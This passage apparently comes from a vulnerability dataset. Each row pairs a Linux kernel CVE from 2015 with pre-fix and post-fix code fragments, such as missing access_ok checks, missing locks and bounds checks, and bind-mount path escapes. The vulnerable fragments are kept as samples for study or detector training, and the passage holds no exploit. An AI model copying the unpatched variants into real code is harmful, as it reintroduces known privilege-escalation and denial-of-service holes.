	 * Check the special variable on the stack to see if NMIs are
	 * executing.
","	 * a nested NMI that updated the copy interrupt stack frame, a
	 * jump will be made to the repeat_nmi code that will handle the second
	 * NMI.
	 *
	 * However, espfix prevents us from directly returning to userspace
	 * with a single IRET instruction.  Similarly, IRET to user mode
	 * can fault.  We therefore handle NMIs from user space like
	 * other IST entries.
	 */

	/* Use %rdx as our temp variable throughout */
 pushq %rdx

 testb $3, CS-RIP+8(%rsp)
 jz	.Lnmi_from_kernel

	/*
	 * NMI from user mode.  We need to run on the thread stack, but we
	 * can't go through the normal entry paths: NMIs are masked, and
	 * we don't want to enable interrupts, because then we'll end
	 * up in an awkward situation in which IRQs are on but NMIs
	 * are off.
	 */

 SWAPGS
 cld
 movq %rsp, %rdx
 movq	PER_CPU_VAR(cpu_current_top_of_stack), %rsp
 pushq	5*8(%rdx)	/* pt_regs->ss */
 pushq	4*8(%rdx)	/* pt_regs->rsp */
 pushq	3*8(%rdx)	/* pt_regs->flags */
 pushq	2*8(%rdx)	/* pt_regs->cs */
 pushq	1*8(%rdx)	/* pt_regs->rip */
 pushq $-1		/* pt_regs->orig_ax */
 pushq %rdi		/* pt_regs->di */
 pushq %rsi		/* pt_regs->si */
 pushq   (%rdx)		/* pt_regs->dx */
 pushq %rcx		/* pt_regs->cx */
 pushq %rax		/* pt_regs->ax */
 pushq %r8		/* pt_regs->r8 */
 pushq %r9		/* pt_regs->r9 */
 pushq %r10		/* pt_regs->r10 */
 pushq %r11		/* pt_regs->r11 */
 pushq %rbx		/* pt_regs->rbx */
 pushq %rbp		/* pt_regs->rbp */
 pushq %r12		/* pt_regs->r12 */
 pushq %r13		/* pt_regs->r13 */
 pushq %r14		/* pt_regs->r14 */
 pushq %r15		/* pt_regs->r15 */

	/*
	 * At this point we no longer need to worry about stack damage
	 * due to nesting -- we're on the normal thread stack and we're
	 * done with the NMI stack.
	 */



 movq %rsp, %rdi
 movq $-1, %rsi
 call	do_nmi

	/*
	 * Return back to user mode.  We must *not* do the normal exit
	 * work, because we don't want to enable interrupts.  Fortunately,
	 * do_nmi doesn't modify pt_regs.
	 */
 SWAPGS
 jmp	restore_c_regs_and_iret

.Lnmi_from_kernel:
	/*
	 * Check the special variable on the stack to see if NMIs are
	 * executing.
"
2016,DoS +Priv ,CVE-2015-3288,"
 pte_unmap(page_table);





 /* Check if we need to add a guard page to the stack */
 if (check_stack_guard_page(vma, address) < 0)
 return VM_FAULT_SIGSEGV;
			- vma->vm_start) >> PAGE_SHIFT) + vma->vm_pgoff;

 pte_unmap(page_table);



 if (!(flags & FAULT_FLAG_WRITE))
 return do_read_fault(mm, vma, address, pmd, pgoff, flags,
				orig_pte);
 barrier();
 if (!pte_present(entry)) {
 if (pte_none(entry)) {
 if (vma->vm_ops) {
 if (likely(vma->vm_ops->fault))
 return do_fault(mm, vma, address, pte,
							pmd, flags, entry);
			}
 return do_anonymous_page(mm, vma, address,
						 pte, pmd, flags);
		}
 return do_swap_page(mm, vma, address,
					pte, pmd, flags, entry);
","
 pte_unmap(page_table);

 /* File mapping without ->vm_ops ? */
 if (vma->vm_flags & VM_SHARED)
 return VM_FAULT_SIGBUS;

 /* Check if we need to add a guard page to the stack */
 if (check_stack_guard_page(vma, address) < 0)
 return VM_FAULT_SIGSEGV;
			- vma->vm_start) >> PAGE_SHIFT) + vma->vm_pgoff;

 pte_unmap(page_table);
 /* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */
 if (!vma->vm_ops->fault)
 return VM_FAULT_SIGBUS;
 if (!(flags & FAULT_FLAG_WRITE))
 return do_read_fault(mm, vma, address, pmd, pgoff, flags,
				orig_pte);
 barrier();
 if (!pte_present(entry)) {
 if (pte_none(entry)) {
 if (vma->vm_ops)
 return do_fault(mm, vma, address, pte, pmd,
						flags, entry);

 return do_anonymous_page(mm, vma, address, pte, pmd,
					flags);

		}
 return do_swap_page(mm, vma, address,
					pte, pmd, flags, entry);
"
2015,Exec Code Overflow ,CVE-2015-3214," return -EOPNOTSUPP;

	addr &= KVM_PIT_CHANNEL_MASK;



	s = &pit_state->channels[addr];

 mutex_lock(&pit_state->lock);
"," return -EOPNOTSUPP;

	addr &= KVM_PIT_CHANNEL_MASK;
 if (addr == 3)
 return 0;

	s = &pit_state->channels[addr];

 mutex_lock(&pit_state->lock);
"
2015,DoS ,CVE-2015-3212," struct list_head addr_waitq;
 struct timer_list addr_wq_timer;
 struct list_head auto_asconf_splist;

 spinlock_t addr_wq_lock;

 /* Lock that protects the local_addr_list writers */
 atomic_t pd_mode;
 /* Receive to here while partial delivery is in effect. */
 struct sk_buff_head pd_lobby;




 struct list_head auto_asconf_list;
 int do_auto_asconf;
};

 /* Supposedly, no process has access to the socket, but
	 * the net layers still may.


 */
 local_bh_disable();
 bh_lock_sock(sk);

 /* Hold the sock, since sk_common_release() will put sock_put()
 sk_common_release(sk);

 bh_unlock_sock(sk);
 local_bh_enable();

 sock_put(sk);

 if ((val && sp->do_auto_asconf) || (!val && !sp->do_auto_asconf))
 return 0;


 if (val == 0 && sp->do_auto_asconf) {
 list_del(&sp->auto_asconf_list);
		sp->do_auto_asconf = 0;
		    &sock_net(sk)->sctp.auto_asconf_splist);
		sp->do_auto_asconf = 1;
	}

 return 0;
}

 local_bh_disable();
 percpu_counter_inc(&sctp_sockets_allocated);
 sock_prot_inuse_add(net, sk->sk_prot, 1);




 if (net->sctp.default_auto_asconf) {

 list_add_tail(&sp->auto_asconf_list,
		    &net->sctp.auto_asconf_splist);
		sp->do_auto_asconf = 1;
	} else

		sp->do_auto_asconf = 0;


 local_bh_enable();

 return 0;
}

/* Cleanup any SCTP per socket resources.  */


static void sctp_destroy_sock(struct sock *sk)
{
 struct sctp_sock *sp;
	newinet->mc_list = NULL;
}














/* Populate the fields of the newsk from the oldsk and migrate the assoc
 * and its messages to the newsk.
 */
 struct sk_buff *skb, *tmp;
 struct sctp_ulpevent *event;
 struct sctp_bind_hashbucket *head;
 struct list_head tmplist;

 /* Migrate socket buffer sizes and all the socket level options to the
	 * new socket.
 */
	newsk->sk_sndbuf = oldsk->sk_sndbuf;
	newsk->sk_rcvbuf = oldsk->sk_rcvbuf;
 /* Brute force copy old sctp opt. */
 if (oldsp->do_auto_asconf) {
 memcpy(&tmplist, &newsp->auto_asconf_list, sizeof(tmplist));
 inet_sk_copy_descendant(newsk, oldsk);
 memcpy(&newsp->auto_asconf_list, &tmplist, sizeof(tmplist));
	} else
 inet_sk_copy_descendant(newsk, oldsk);

 /* Restore the ep value that was overwritten with the above structure
	 * copy.
"," struct list_head addr_waitq;
 struct timer_list addr_wq_timer;
 struct list_head auto_asconf_splist;
 /* Lock that protects both addr_waitq and auto_asconf_splist */
 spinlock_t addr_wq_lock;

 /* Lock that protects the local_addr_list writers */
 atomic_t pd_mode;
 /* Receive to here while partial delivery is in effect. */
 struct sk_buff_head pd_lobby;

 /* These must be the last fields, as they will skipped on copies,
	 * like on accept and peeloff operations
 */
 struct list_head auto_asconf_list;
 int do_auto_asconf;
};

 /* Supposedly, no process has access to the socket, but
	 * the net layers still may.
	 * Also, sctp_destroy_sock() needs to be called with addr_wq_lock
	 * held and that should be grabbed before socket lock.
 */
 spin_lock_bh(&net->sctp.addr_wq_lock);
 bh_lock_sock(sk);

 /* Hold the sock, since sk_common_release() will put sock_put()
 sk_common_release(sk);

 bh_unlock_sock(sk);
 spin_unlock_bh(&net->sctp.addr_wq_lock);

 sock_put(sk);

 if ((val && sp->do_auto_asconf) || (!val && !sp->do_auto_asconf))
 return 0;

 spin_lock_bh(&sock_net(sk)->sctp.addr_wq_lock);
 if (val == 0 && sp->do_auto_asconf) {
 list_del(&sp->auto_asconf_list);
		sp->do_auto_asconf = 0;
		    &sock_net(sk)->sctp.auto_asconf_splist);
		sp->do_auto_asconf = 1;
	}
 spin_unlock_bh(&sock_net(sk)->sctp.addr_wq_lock);
 return 0;
}

 local_bh_disable();
 percpu_counter_inc(&sctp_sockets_allocated);
 sock_prot_inuse_add(net, sk->sk_prot, 1);

 /* Nothing can fail after this block, otherwise
	 * sctp_destroy_sock() will be called without addr_wq_lock held
 */
 if (net->sctp.default_auto_asconf) {
 spin_lock(&sock_net(sk)->sctp.addr_wq_lock);
 list_add_tail(&sp->auto_asconf_list,
		    &net->sctp.auto_asconf_splist);
		sp->do_auto_asconf = 1;
 spin_unlock(&sock_net(sk)->sctp.addr_wq_lock);
	} else {
		sp->do_auto_asconf = 0;
	}

 local_bh_enable();

 return 0;
}

/* Cleanup any SCTP per socket resources. Must be called with
 * sock_net(sk)->sctp.addr_wq_lock held if sp->do_auto_asconf is true
 */
static void sctp_destroy_sock(struct sock *sk)
{
 struct sctp_sock *sp;
	newinet->mc_list = NULL;
}

static inline void sctp_copy_descendant(struct sock *sk_to,
 const struct sock *sk_from)
{
 int ancestor_size = sizeof(struct inet_sock) +
 sizeof(struct sctp_sock) -
 offsetof(struct sctp_sock, auto_asconf_list);

 if (sk_from->sk_family == PF_INET6)
		ancestor_size += sizeof(struct ipv6_pinfo);

 __inet_sk_copy_descendant(sk_to, sk_from, ancestor_size);
}

/* Populate the fields of the newsk from the oldsk and migrate the assoc
 * and its messages to the newsk.
 */
 struct sk_buff *skb, *tmp;
 struct sctp_ulpevent *event;
 struct sctp_bind_hashbucket *head;


 /* Migrate socket buffer sizes and all the socket level options to the
	 * new socket.
 */
	newsk->sk_sndbuf = oldsk->sk_sndbuf;
	newsk->sk_rcvbuf = oldsk->sk_rcvbuf;
 /* Brute force copy old sctp opt. */
 sctp_copy_descendant(newsk, oldsk);






 /* Restore the ep value that was overwritten with the above structure
	 * copy.
"
2015,Bypass ,CVE-2015-2925," return 0;
}



















static inline int nd_alloc_stack(struct nameidata *nd)
{
 if (likely(nd->depth != EMBEDDED_LEVELS))
 return -ECHILD;
			nd->path.dentry = parent;
			nd->seq = seq;


 break;
		} else {
 struct mount *mnt = real_mount(nd->path.mnt);
	}
}

static void follow_dotdot(struct nameidata *nd)
{
 if (!nd->root.mnt)
 set_root(nd);
 /* rare case of legitimate dget_parent()... */
			nd->path.dentry = dget_parent(nd->path.dentry);
 dput(old);


 break;
		}
 if (!follow_up(&nd->path))
 break;
	}
 follow_mount(&nd->path);
	nd->inode = nd->path.dentry->d_inode;

}

/*
 if (nd->flags & LOOKUP_RCU) {
 return follow_dotdot_rcu(nd);
		} else
 follow_dotdot(nd);
	}
 return 0;
}
"," return 0;
}

/**
 * path_connected - Verify that a path->dentry is below path->mnt.mnt_root
 * @path: nameidate to verify
 *
 * Rename can sometimes move a file or directory outside of a bind
 * mount, path_connected allows those cases to be detected.
 */
static bool path_connected(const struct path *path)
{
 struct vfsmount *mnt = path->mnt;

 /* Only bind mounts can have disconnected paths */
 if (mnt->mnt_root == mnt->mnt_sb->s_root)
 return true;

 return is_subdir(path->dentry, mnt->mnt_root);
}

static inline int nd_alloc_stack(struct nameidata *nd)
{
 if (likely(nd->depth != EMBEDDED_LEVELS))
 return -ECHILD;
			nd->path.dentry = parent;
			nd->seq = seq;
 if (unlikely(!path_connected(&nd->path)))
 return -ENOENT;
 break;
		} else {
 struct mount *mnt = real_mount(nd->path.mnt);
	}
}

static int follow_dotdot(struct nameidata *nd)
{
 if (!nd->root.mnt)
 set_root(nd);
 /* rare case of legitimate dget_parent()... */
			nd->path.dentry = dget_parent(nd->path.dentry);
 dput(old);
 if (unlikely(!path_connected(&nd->path)))
 return -ENOENT;
 break;
		}
 if (!follow_up(&nd->path))
 break;
	}
 follow_mount(&nd->path);
	nd->inode = nd->path.dentry->d_inode;
 return 0;
}

/*
 if (nd->flags & LOOKUP_RCU) {
 return follow_dotdot_rcu(nd);
		} else
 return follow_dotdot(nd);
	}
 return 0;
}
"
2015,,CVE-2015-2922," if (rt)
 rt6_set_expires(rt, jiffies + (HZ * lifetime));
 if (ra_msg->icmph.icmp6_hop_limit) {
		in6_dev->cnf.hop_limit = ra_msg->icmph.icmp6_hop_limit;







 if (rt)
 dst_metric_set(&rt->dst, RTAX_HOPLIMIT,
				       ra_msg->icmph.icmp6_hop_limit);
"," if (rt)
 rt6_set_expires(rt, jiffies + (HZ * lifetime));
 if (ra_msg->icmph.icmp6_hop_limit) {
 /* Only set hop_limit on the interface if it is higher than
		 * the current hop_limit.
 */
 if (in6_dev->cnf.hop_limit < ra_msg->icmph.icmp6_hop_limit) {
			in6_dev->cnf.hop_limit = ra_msg->icmph.icmp6_hop_limit;
		} else {
 ND_PRINTK(2, warn, ""RA: Got route advertisement with lower hop_limit than current\n"");
		}
 if (rt)
 dst_metric_set(&rt->dst, RTAX_HOPLIMIT,
				       ra_msg->icmph.icmp6_hop_limit);
"
2017,#NAME?,CVE-2015-2877,,
2015,Bypass ,CVE-2015-2830," testl $3, CS-ARGOFFSET(%rsp)		# from kernel_thread?
 jz   1f

 testl $_TIF_IA32, TI_flags(%rcx)	# 32-bit compat task needs IRET
 jnz  int_ret_from_sys_call

	RESTORE_TOP_OF_STACK %rdi, -ARGOFFSET
 jmp ret_from_sys_call			# go to the SYSRET fastpath




1:
 subq $REST_SKIP, %rsp # leave space for volatiles
"," testl $3, CS-ARGOFFSET(%rsp)		# from kernel_thread?
 jz   1f

	/*
	 * By the time we get here, we have no idea whether our pt_regs,
	 * ti flags, and ti status came from the 64-bit SYSCALL fast path,
	 * the slow path, or one of the ia32entry paths.
	 * Use int_ret_from_sys_call to return, since it can safely handle
	 * all of the above.
	 */
 jmp  int_ret_from_sys_call

1:
 subq $REST_SKIP, %rsp # leave space for volatiles
"
2016,#NAME?,CVE-2015-2686,"
 if (len > INT_MAX)
		len = INT_MAX;


	sock = sockfd_lookup_light(fd, &err, &fput_needed);
 if (!sock)
 goto out;

 if (size > INT_MAX)
		size = INT_MAX;


	sock = sockfd_lookup_light(fd, &err, &fput_needed);
 if (!sock)
 goto out;
","
 if (len > INT_MAX)
		len = INT_MAX;
 if (unlikely(!access_ok(VERIFY_READ, buff, len)))
 return -EFAULT;
	sock = sockfd_lookup_light(fd, &err, &fput_needed);
 if (!sock)
 goto out;

 if (size > INT_MAX)
		size = INT_MAX;
 if (unlikely(!access_ok(VERIFY_WRITE, ubuf, size)))
 return -EFAULT;
	sock = sockfd_lookup_light(fd, &err, &fput_needed);
 if (!sock)
 goto out;
"
2016,DoS ,CVE-2015-2672," if (boot_cpu_has(X86_FEATURE_XSAVES))
 asm volatile(""1:""XSAVES""\n\t""
 ""2:\n\t""
			: : ""D"" (fx), ""m"" (*fx), ""a"" (lmask), ""d"" (hmask)

			:   ""memory"");
 else
 asm volatile(""1:""XSAVE""\n\t""
 ""2:\n\t""
			: : ""D"" (fx), ""m"" (*fx), ""a"" (lmask), ""d"" (hmask)

			:   ""memory"");

 asm volatile(xstate_fault
		     : ""0"" (0)
		     : ""memory"");

 return err;
}

 if (boot_cpu_has(X86_FEATURE_XSAVES))
 asm volatile(""1:""XRSTORS""\n\t""
 ""2:\n\t""
			: : ""D"" (fx), ""m"" (*fx), ""a"" (lmask), ""d"" (hmask)

			:   ""memory"");
 else
 asm volatile(""1:""XRSTOR""\n\t""
 ""2:\n\t""
			: : ""D"" (fx), ""m"" (*fx), ""a"" (lmask), ""d"" (hmask)

			:   ""memory"");

 asm volatile(xstate_fault
		     : ""0"" (0)
		     : ""memory"");

 return err;
}

 */
 alternative_input_2(
 ""1:""XSAVE,
 ""1:""XSAVEOPT,
		X86_FEATURE_XSAVEOPT,
 ""1:""XSAVES,
		X86_FEATURE_XSAVES,
		[fx] ""D"" (fx), ""a"" (lmask), ""d"" (hmask) :
 ""memory"");
 */
 alternative_input(
 ""1: "" XRSTOR,
 ""1: "" XRSTORS,
		X86_FEATURE_XSAVES,
 ""D"" (fx), ""m"" (*fx), ""a"" (lmask), ""d"" (hmask)
		: ""memory"");
"," if (boot_cpu_has(X86_FEATURE_XSAVES))
 asm volatile(""1:""XSAVES""\n\t""
 ""2:\n\t""
			     xstate_fault
			: ""D"" (fx), ""m"" (*fx), ""a"" (lmask), ""d"" (hmask)
			:   ""memory"");
 else
 asm volatile(""1:""XSAVE""\n\t""
 ""2:\n\t""
			     xstate_fault
			: ""D"" (fx), ""m"" (*fx), ""a"" (lmask), ""d"" (hmask)
			:   ""memory"");





 return err;
}

 if (boot_cpu_has(X86_FEATURE_XSAVES))
 asm volatile(""1:""XRSTORS""\n\t""
 ""2:\n\t""
			     xstate_fault
			: ""D"" (fx), ""m"" (*fx), ""a"" (lmask), ""d"" (hmask)
			:   ""memory"");
 else
 asm volatile(""1:""XRSTOR""\n\t""
 ""2:\n\t""
			     xstate_fault
			: ""D"" (fx), ""m"" (*fx), ""a"" (lmask), ""d"" (hmask)
			:   ""memory"");





 return err;
}

 */
 alternative_input_2(
 ""1:""XSAVE,
		XSAVEOPT,
		X86_FEATURE_XSAVEOPT,
		XSAVES,
		X86_FEATURE_XSAVES,
		[fx] ""D"" (fx), ""a"" (lmask), ""d"" (hmask) :
 ""memory"");
 */
 alternative_input(
 ""1: "" XRSTOR,
		XRSTORS,
		X86_FEATURE_XSAVES,
 ""D"" (fx), ""m"" (*fx), ""a"" (lmask), ""d"" (hmask)
		: ""memory"");
"
2015,Overflow +Priv ,CVE-2015-2666," unsigned int mc_saved_count = mc_saved_data->mc_saved_count;
 int i;

 while (leftover) {
		mc_header = (struct microcode_header_intel *)ucode_ptr;

		mc_size = get_totalsize(mc_header);
"," unsigned int mc_saved_count = mc_saved_data->mc_saved_count;
 int i;

 while (leftover && mc_saved_count < ARRAY_SIZE(mc_saved_tmp)) {
		mc_header = (struct microcode_header_intel *)ucode_ptr;

		mc_size = get_totalsize(mc_header);
"
2015,DoS ,CVE-2015-2150,"#include ""conf_space.h""
#include ""conf_space_quirks.h""

static bool permissive;
module_param(permissive, bool, 0644);

/* This is where xen_pcibk_read_config_byte, xen_pcibk_read_config_word,
 void *data;
};



#define OFFSET(cfg_entry) ((cfg_entry)->base_offset+(cfg_entry)->field->offset)

/* Add fields to a device - the add_fields macro expects to get a pointer to
#include ""pciback.h""
#include ""conf_space.h""





struct pci_bar_info {
	u32 val;
	u32 len_val;
#define is_enable_cmd(value) ((value)&(PCI_COMMAND_MEMORY|PCI_COMMAND_IO))
#define is_master_cmd(value) ((value)&PCI_COMMAND_MASTER)

static int command_read(struct pci_dev *dev, int offset, u16 *value, void *data)





{
 int i;
 int ret;

	ret = xen_pcibk_read_config_word(dev, offset, value, data);
 if (!pci_is_enabled(dev))
 return ret;

 for (i = 0; i < PCI_ROM_RESOURCE; i++) {
 if (dev->resource[i].flags & IORESOURCE_IO)
			*value |= PCI_COMMAND_IO;
 if (dev->resource[i].flags & IORESOURCE_MEM)
			*value |= PCI_COMMAND_MEMORY;
	}












 return ret;
}

static int command_write(struct pci_dev *dev, int offset, u16 value, void *data)
{
 struct xen_pcibk_dev_data *dev_data;
 int err;



	dev_data = pci_get_drvdata(dev);
 if (!pci_is_enabled(dev) && is_enable_cmd(value)) {
		}
	}














 return pci_write_config_word(dev, offset, value);
}

	{
	 .offset    = PCI_COMMAND,
	 .size      = 2,


	 .u.w.read  = command_read,
	 .u.w.write = command_write,
	},
","#include ""conf_space.h""
#include ""conf_space_quirks.h""

bool permissive;
module_param(permissive, bool, 0644);

/* This is where xen_pcibk_read_config_byte, xen_pcibk_read_config_word,
 void *data;
};

extern bool permissive;

#define OFFSET(cfg_entry) ((cfg_entry)->base_offset+(cfg_entry)->field->offset)

/* Add fields to a device - the add_fields macro expects to get a pointer to
#include ""pciback.h""
#include ""conf_space.h""

struct pci_cmd_info {
	u16 val;
};

struct pci_bar_info {
	u32 val;
	u32 len_val;
#define is_enable_cmd(value) ((value)&(PCI_COMMAND_MEMORY|PCI_COMMAND_IO))
#define is_master_cmd(value) ((value)&PCI_COMMAND_MASTER)

/* Bits guests are allowed to control in permissive mode. */
#define PCI_COMMAND_GUEST (PCI_COMMAND_MASTER|PCI_COMMAND_SPECIAL| \
			   PCI_COMMAND_INVALIDATE|PCI_COMMAND_VGA_PALETTE| \
			   PCI_COMMAND_WAIT|PCI_COMMAND_FAST_BACK)

static void *command_init(struct pci_dev *dev, int offset)
{
 struct pci_cmd_info *cmd = kmalloc(sizeof(*cmd), GFP_KERNEL);
 int err;

 if (!cmd)
 return ERR_PTR(-ENOMEM);

	err = pci_read_config_word(dev, PCI_COMMAND, &cmd->val);
 if (err) {
 kfree(cmd);
 return ERR_PTR(err);


	}

 return cmd;
}

static int command_read(struct pci_dev *dev, int offset, u16 *value, void *data)
{
 int ret = pci_read_config_word(dev, offset, value);
 const struct pci_cmd_info *cmd = data;

	*value &= PCI_COMMAND_GUEST;
	*value |= cmd->val & ~PCI_COMMAND_GUEST;

 return ret;
}

static int command_write(struct pci_dev *dev, int offset, u16 value, void *data)
{
 struct xen_pcibk_dev_data *dev_data;
 int err;
	u16 val;
 struct pci_cmd_info *cmd = data;

	dev_data = pci_get_drvdata(dev);
 if (!pci_is_enabled(dev) && is_enable_cmd(value)) {
		}
	}

	cmd->val = value;

 if (!permissive && (!dev_data || !dev_data->permissive))
 return 0;

 /* Only allow the guest to control certain bits. */
	err = pci_read_config_word(dev, offset, &val);
 if (err || val == value)
 return err;

	value &= PCI_COMMAND_GUEST;
	value |= val & ~PCI_COMMAND_GUEST;

 return pci_write_config_word(dev, offset, value);
}

	{
	 .offset    = PCI_COMMAND,
	 .size      = 2,
	 .init      = command_init,
	 .release   = bar_release,
	 .u.w.read  = command_read,
	 .u.w.write = command_write,
	},
"
2015,#NAME?,CVE-2015-2042,"	{
		.procname	= ""max_unacked_packets"",
		.data		= &rds_sysctl_max_unacked_packets,
		.maxlen         = sizeof(unsigned long),
		.mode           = 0644,
		.proc_handler   = proc_dointvec,
	},
	{
		.procname	= ""max_unacked_bytes"",
		.data		= &rds_sysctl_max_unacked_bytes,
		.maxlen         = sizeof(unsigned long),
		.mode           = 0644,
		.proc_handler   = proc_dointvec,
	},
","	{
		.procname	= ""max_unacked_packets"",
		.data		= &rds_sysctl_max_unacked_packets,
		.maxlen         = sizeof(int),
		.mode           = 0644,
		.proc_handler   = proc_dointvec,
	},
	{
		.procname	= ""max_unacked_bytes"",
		.data		= &rds_sysctl_max_unacked_bytes,
		.maxlen         = sizeof(int),
		.mode           = 0644,
		.proc_handler   = proc_dointvec,
	},
"
2015,#NAME?,CVE-2015-2041,"	{
		.procname	= ""ack"",
		.data		= &sysctl_llc2_ack_timeout,
		.maxlen		= sizeof(long),
		.mode		= 0644,
		.proc_handler   = proc_dointvec_jiffies,
	},
	{
		.procname	= ""busy"",
		.data		= &sysctl_llc2_busy_timeout,
		.maxlen		= sizeof(long),
		.mode		= 0644,
		.proc_handler   = proc_dointvec_jiffies,
	},
	{
		.procname	= ""p"",
		.data		= &sysctl_llc2_p_timeout,
		.maxlen		= sizeof(long),
		.mode		= 0644,
		.proc_handler   = proc_dointvec_jiffies,
	},
	{
		.procname	= ""rej"",
		.data		= &sysctl_llc2_rej_timeout,
		.maxlen		= sizeof(long),
		.mode		= 0644,
		.proc_handler   = proc_dointvec_jiffies,
	},
","	{
		.procname	= ""ack"",
		.data		= &sysctl_llc2_ack_timeout,
		.maxlen		= sizeof(sysctl_llc2_ack_timeout),
		.mode		= 0644,
		.proc_handler   = proc_dointvec_jiffies,
	},
	{
		.procname	= ""busy"",
		.data		= &sysctl_llc2_busy_timeout,
		.maxlen		= sizeof(sysctl_llc2_busy_timeout),
		.mode		= 0644,
		.proc_handler   = proc_dointvec_jiffies,
	},
	{
		.procname	= ""p"",
		.data		= &sysctl_llc2_p_timeout,
		.maxlen		= sizeof(sysctl_llc2_p_timeout),
		.mode		= 0644,
		.proc_handler   = proc_dointvec_jiffies,
	},
	{
		.procname	= ""rej"",
		.data		= &sysctl_llc2_rej_timeout,
		.maxlen		= sizeof(sysctl_llc2_rej_timeout),
		.mode		= 0644,
		.proc_handler   = proc_dointvec_jiffies,
	},
"
2015,DoS +Priv ,CVE-2015-1805," pipe_lock(pipe);
}

static int
pipe_iov_copy_from_user(void *to, struct iovec *iov, unsigned long len,
 int atomic)
{
 unsigned long copy;

 while (len > 0) {
 while (!iov->iov_len)
			iov++;
		copy = min_t(unsigned long, len, iov->iov_len);

 if (atomic) {
 if (__copy_from_user_inatomic(to, iov->iov_base, copy))
 return -EFAULT;
		} else {
 if (copy_from_user(to, iov->iov_base, copy))
 return -EFAULT;
		}
		to += copy;
		len -= copy;
		iov->iov_base += copy;
		iov->iov_len -= copy;
	}
 return 0;
}

/*
 * Pre-fault in the user memory, so we can use atomic copies.
 */
static void iov_fault_in_pages_read(struct iovec *iov, unsigned long len)
{
 while (!iov->iov_len)
		iov++;

 while (len > 0) {
 unsigned long this_len;

		this_len = min_t(unsigned long, len, iov->iov_len);
 fault_in_pages_readable(iov->iov_base, this_len);
		len -= this_len;
		iov++;
	}
}

static void anon_pipe_buf_release(struct pipe_inode_info *pipe,
 struct pipe_buffer *buf)
{
}

static ssize_t
pipe_write(struct kiocb *iocb, const struct iovec *_iov,
 unsigned long nr_segs, loff_t ppos)
{
 struct file *filp = iocb->ki_filp;
 struct pipe_inode_info *pipe = filp->private_data;
 ssize_t ret;
 int do_wakeup;
 struct iovec *iov = (struct iovec *)_iov;
 size_t total_len;
 ssize_t chars;

	total_len = iov_length(iov, nr_segs);
 /* Null write succeeds. */
 if (unlikely(total_len == 0))
 return 0;

	do_wakeup = 0;
	ret = 0;
 __pipe_lock(pipe);

 if (!pipe->readers) {
 int offset = buf->offset + buf->len;

 if (ops->can_merge && offset + chars <= PAGE_SIZE) {
 int error, atomic = 1;
 void *addr;

			error = ops->confirm(pipe, buf);
 if (error)
 goto out;

 iov_fault_in_pages_read(iov, chars);
redo1:
 if (atomic)
				addr = kmap_atomic(buf->page);
 else
				addr = kmap(buf->page);
			error = pipe_iov_copy_from_user(offset + addr, iov,
							chars, atomic);
 if (atomic)
 kunmap_atomic(addr);
 else
 kunmap(buf->page);
			ret = error;
			do_wakeup = 1;
 if (error) {
 if (atomic) {
					atomic = 0;
 goto redo1;
				}
 goto out;
			}

			buf->len += chars;
			total_len -= chars;
			ret = chars;
 if (!total_len)
 goto out;
		}
	}
 int newbuf = (pipe->curbuf + bufs) & (pipe->buffers-1);
 struct pipe_buffer *buf = pipe->bufs + newbuf;
 struct page *page = pipe->tmp_page;
 char *src;
 int error, atomic = 1;

 if (!page) {
				page = alloc_page(GFP_HIGHUSER);
			 * FIXME! Is this really true?
 */
			do_wakeup = 1;
			chars = PAGE_SIZE;
 if (chars > total_len)
				chars = total_len;

 iov_fault_in_pages_read(iov, chars);
redo2:
 if (atomic)
				src = kmap_atomic(page);
 else
				src = kmap(page);

			error = pipe_iov_copy_from_user(src, iov, chars,
							atomic);
 if (atomic)
 kunmap_atomic(src);
 else
 kunmap(page);

 if (unlikely(error)) {
 if (atomic) {
					atomic = 0;
 goto redo2;
				}
 if (!ret)
					ret = error;
 break;
			}
			ret += chars;

 /* Insert it into the buffer array */
			buf->page = page;
			buf->ops = &anon_pipe_buf_ops;
			buf->offset = 0;
			buf->len = chars;
			buf->flags = 0;
 if (is_packetized(filp)) {
				buf->ops = &packet_pipe_buf_ops;
 pipe->nrbufs = ++bufs;
 pipe->tmp_page = NULL;

			total_len -= chars;
 if (!total_len)
 break;
		}
 if (bufs < pipe->buffers)
	.llseek		= no_llseek,
	.read		= new_sync_read,
	.read_iter	= pipe_read,
	.write		= do_sync_write,
	.aio_write	= pipe_write,
	.poll		= pipe_poll,
	.unlocked_ioctl	= pipe_ioctl,
	.release	= pipe_release,
size_t iov_iter_single_seg_count(const struct iov_iter *i);
size_t copy_page_to_iter(struct page *page, size_t offset, size_t bytes,
 struct iov_iter *i);


unsigned long iov_iter_alignment(const struct iov_iter *i);
void iov_iter_init(struct iov_iter *i, int direction, const struct iovec *iov,
 unsigned long nr_segs, size_t count);
}
EXPORT_SYMBOL(copy_page_to_iter);















































































static size_t __iovec_copy_from_user_inatomic(char *vaddr,
 const struct iovec *iov, size_t base, size_t bytes)
{
"," pipe_lock(pipe);
}













































static void anon_pipe_buf_release(struct pipe_inode_info *pipe,
 struct pipe_buffer *buf)
{
}

static ssize_t
pipe_write(struct kiocb *iocb, struct iov_iter *from)

{
 struct file *filp = iocb->ki_filp;
 struct pipe_inode_info *pipe = filp->private_data;
 ssize_t ret = 0;
 int do_wakeup = 0;
 size_t total_len = iov_iter_count(from);

 ssize_t chars;


 /* Null write succeeds. */
 if (unlikely(total_len == 0))
 return 0;



 __pipe_lock(pipe);

 if (!pipe->readers) {
 int offset = buf->offset + buf->len;

 if (ops->can_merge && offset + chars <= PAGE_SIZE) {
 int error = ops->confirm(pipe, buf);



 if (error)
 goto out;

			ret = copy_page_from_iter(buf->page, offset, chars, from);
 if (unlikely(ret < chars)) {
				error = -EFAULT;
















 goto out;
			}
			do_wakeup = 1;
			buf->len += chars;

			ret = chars;
 if (!iov_iter_count(from))
 goto out;
		}
	}
 int newbuf = (pipe->curbuf + bufs) & (pipe->buffers-1);
 struct pipe_buffer *buf = pipe->bufs + newbuf;
 struct page *page = pipe->tmp_page;
 int copied;


 if (!page) {
				page = alloc_page(GFP_HIGHUSER);
			 * FIXME! Is this really true?
 */
			do_wakeup = 1;
			copied = copy_page_from_iter(page, 0, PAGE_SIZE, from);
 if (unlikely(copied < PAGE_SIZE && iov_iter_count(from))) {





















 if (!ret)
					ret = -EFAULT;
 break;
			}
			ret += copied;

 /* Insert it into the buffer array */
			buf->page = page;
			buf->ops = &anon_pipe_buf_ops;
			buf->offset = 0;
			buf->len = copied;
			buf->flags = 0;
 if (is_packetized(filp)) {
				buf->ops = &packet_pipe_buf_ops;
 pipe->nrbufs = ++bufs;
 pipe->tmp_page = NULL;

 if (!iov_iter_count(from))

 break;
		}
